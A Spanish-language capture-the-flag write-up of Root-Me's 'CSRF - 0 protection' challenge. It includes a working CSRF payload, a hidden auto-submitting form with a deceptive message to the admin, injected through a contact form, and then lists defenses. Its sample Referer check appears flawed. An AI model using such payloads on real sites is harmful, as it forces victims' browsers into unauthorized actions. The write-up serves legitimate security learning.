Writeup: CSRF - 0 Protection (Root-Me)

📌 Información General

Campo		Valor
Plataforma	Root-Me
Challenge	CSRF - 0 protection
Puntuación	35 puntos
Dificultad	1/5
Categoría	Web-Client
Autor		sambecks
Fecha		16 febrero 2016

📖 Descripción del Reto

La aplicación consiste en una intranet donde los usuarios pueden registrarse y acceder a diferentes secciones:

    Contact: Formulario para enviar mensajes al administrador

    Profile: Edición del perfil de usuario

    Private: Área restringida que requiere validación del administrador

El objetivo es activar nuestra cuenta para acceder al área privada y obtener la flag.

🔍 Fase de Reconocimiento

1. Registro y Login

Creamos un usuario para acceder al sistema:
bash

Usuario: kr3s4l4
Contraseña: kr3s4l4

2. Exploración de la Aplicación

Al loguearnos, encontramos cuatro secciones principales:
text

[Contact] | [Profile] | [Private] | [Logout]

Sección Private
text

Your account has not been validated by an administrator, please wait.

Nuestra cuenta está pendiente de activación por parte del administrador.
Sección Profile
html

<form action="?action=profile" method="post" enctype="multipart/form-data">
    <label>Username:</label>
    <input type="text" name="username" value="kr3s4l4">
    <label>Status:</label>
    <input type="checkbox" name="status" disabled>
    <button type="submit">Submit</button>
</form>

Observaciones clave:

    El campo username es modificable

    El campo status está deshabilitado (disabled)

    El formulario usa enctype="multipart/form-data"

Sección Contact
html

<form method="post" action="?action=contact">
    <input type="email" placeholder="Your email">
    <textarea name="content"></textarea>
    <button type="submit">Submit</button>
</form>

Observaciones clave:

    El campo email no tiene atributo name, por lo que no se envía

    El campo content es donde podemos inyectar contenido

    No hay token CSRF visible

🧪 Análisis de Vulnerabilidad
Identificación del Vector de Ataque

    El campo status está deshabilitado → Los usuarios normales no pueden activar su cuenta

    Solo el administrador puede activar cuentas → El admin tiene acceso al panel de validación

    El formulario de Contact permite HTML → Podemos inyectar contenido que el admin ejecutará

    No hay protección CSRF → El admin es vulnerable a ataques CSRF

Flujo del Ataque
text

1. Usuario envía mensaje en Contact con payload malicioso
                    ↓
2. Administrador abre el mensaje en su panel
                    ↓
3. El payload se ejecuta automáticamente
                    ↓
4. El administrador (sin saberlo) activa la cuenta del usuario
                    ↓
5. Usuario accede a Private y obtiene la flag

🚀 Desarrollo del Exploit

1. Análisis de la Petición de Activación

Capturamos la petición que se envía al actualizar el perfil en Profile:
http

POST /web-client/ch22/index.php?action=profile HTTP/1.1
Host: challenge01.root-me.org
Cookie: PHPSESSID=009c71be74a2dc712ba296e4b4e4aa4a
Content-Type: application/x-www-form-urlencoded
Content-Length: XX

username=kr3s4l4&status=on

Conclusión: Para activar la cuenta, debemos enviar una petición POST a ?action=profile con los parámetros:

    username=kr3s4l4

    status=on

2. Construcción del Payload CSRF

Necesitamos que el administrador, al abrir el mensaje, envíe automáticamente esta petición.
Payload Final:
html

<p>Hello Admin, I have an issue loading my intranet profile metadata. Could you please look at this page?</p>

<form name="csrf_exploit" action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="POST" enctype="multipart/form-data" style="display:none;">
    <input type="text" name="username" value="kr3s4l4" />
    <input type="checkbox" name="status" value="on" checked="checked" />
</form>

<script>
    // Envía el formulario automáticamente en cuanto el admin abra el mensaje
    document.csrf_exploit.submit();
</script>

Explicación del Payload:

    Texto persuasivo: "Hello Admin, I have an issue..." → Engaña al admin para que abra el mensaje

    Formulario oculto: style="display:none" → El admin no ve nada sospechoso

    Campos predefinidos:

        username=kr3s4l4 → Nuestro usuario

        status=on checked → Activa la cuenta

    Auto-submit: document.csrf_exploit.submit() → El formulario se envía automáticamente

3. Inyección del Payload

    Navegamos a la sección Contact

    Pegamos el payload en el campo content

    Hacemos clic en Submit

http

POST /web-client/ch22/index.php?action=contact HTTP/1.1
Host: challenge01.root-me.org
Cookie: PHPSESSID=009c71be74a2dc712ba296e4b4e4aa4a
Content-Type: application/x-www-form-urlencoded

content=%3Cp%3EHello+Admin%2C+I+have+an+issue...

🎯 Ejecución del Ataque

1. Simulación del Administrador

El reto simula que el administrador abre el mensaje automáticamente. Al hacerlo:

    El mensaje se renderiza en el panel del admin

    El <script> se ejecuta

    El formulario se envía automáticamente a ?action=profile

    La cuenta kr3s4l4 se activa

2. Verificación del Éxito

Accedemos a la sección Private:
html

<a href="?action=private">Private</a>

Resultado:
text

Good job dude, flag is : **************!

📊 Resumen Técnico
Componente		Detalle
Vulnerabilidad		CSRF (Cross-Site Request Forgery) sin protección
Vector de Ataque	Formulario de contacto → Inyección de HTML/JavaScript
Payload			Formulario oculto con auto-submit
Acción Explotada	Activación de cuenta (status=on)
Permisos Necesarios	Sesión del administrador
Impacto			Activación de cuenta y obtención de flag

🛡️ Medidas de Protección

Para prevenir este tipo de ataques, la aplicación debería implementar:
1. Token Anti-CSRF
html

<input type="hidden" name="csrf_token" value="aleatorio_por_sesion">

2. Validación de Referer
php

if (strpos($_SERVER['HTTP_REFERER'], 'challenge01.root-me.org') !== 0) {
    die('CSRF protection');
}

3. SameSite Cookies
http

Set-Cookie: PHPSESSID=xxx; SameSite=Lax

4. Verificación de Privilegios
php

if ($_SESSION['role'] != 'admin') {
    die('Access denied');
}

5. Confirmación de Acciones Críticas

    Pedir la contraseña nuevamente

    Enviar email de confirmación

    Usar autenticación de dos factores

📝 Conclusión

Este reto demuestra de manera práctica cómo un ataque CSRF puede ser utilizado para realizar acciones no autorizadas en nombre de un usuario autenticado (en este caso, el administrador).

Lecciones aprendidas:

    Siempre implementar tokens anti-CSRF en formularios que realicen cambios de estado

    Los campos deshabilitados no son suficientes como medida de seguridad

    Validar el origen de las peticiones (Referer/Origin headers)

    Las sesiones de administrador deben tener protecciones adicionales
